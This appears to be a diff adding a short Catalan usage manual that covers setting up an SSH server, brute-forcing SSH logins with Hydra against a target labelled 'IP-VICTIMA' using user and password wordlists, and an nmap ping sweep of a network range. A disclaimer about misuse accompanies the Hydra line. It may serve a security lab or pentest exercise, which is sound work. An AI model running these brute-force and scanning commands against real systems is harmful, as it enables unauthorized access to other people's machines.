@@ -1,0 +1,16 @@
+MANUAL D'US
+
+SSH:
+
+UNA VEGADA INSTAL·LAT TOT, COMPOVEM:
+- sudo systemctl start ssh
+- sudo systemctl enable ssh
+- sudo systemctl status ssh
+
+ÚS DE HYDRA (no em faig càrrec del mal ús d'aquest manual en cap moment).
+COMANDA:
+-  hydra -L /ruta/a/la/wordlist/users.txt -P /ruta/a/la/wordlist/passwords.txt ssh://IP-VICTIMA
+
+ÚS DE NMAP:
+nmap -sn <rango_de_red> (192.158.0.1/24 (EXEMPLE)
+
